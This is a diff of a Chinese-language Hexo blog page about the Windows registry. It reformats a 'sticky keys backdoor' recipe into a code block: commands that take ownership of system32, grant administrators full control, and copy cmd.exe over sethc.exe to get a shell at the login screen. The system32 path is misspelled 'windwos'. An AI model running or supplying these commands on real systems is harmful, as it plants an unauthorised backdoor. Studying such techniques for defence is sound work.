@@ -15,7 +15,7 @@
 <meta property="og:description" content="注册表： ​    数据类型： 1234REG_SZ：字符串：文本字符串REG_MULTI_SZ：多字符串值：含有多个文本值的字符串REG_BINARY：二进制数：二进制值，以十六进制显示，REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值  ​    创建注册表：   regedit 自启动路径： HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-07-12T03:13:16.000Z">
-<meta property="article:modified_time" content="2021-07-12T03:15:32.960Z">
+<meta property="article:modified_time" content="2021-07-12T03:21:04.012Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -104,10 +104,9 @@
 <p>​        最底下：默认以管理员权限运行</p>
 <p>粘滞键后门：</p>
 <p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
-<p>​    1. takeown /F c:\windwos\system32* /A /R</p>
-<p>​    2.cacls c:\windwos\system32\* /T /E /G administrators:F</p>
-<p>​    3.copy cmd.exe sethc.exe</p>
-<p>​    4.连续按5次shift键呼出cmd</p>
+<p>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
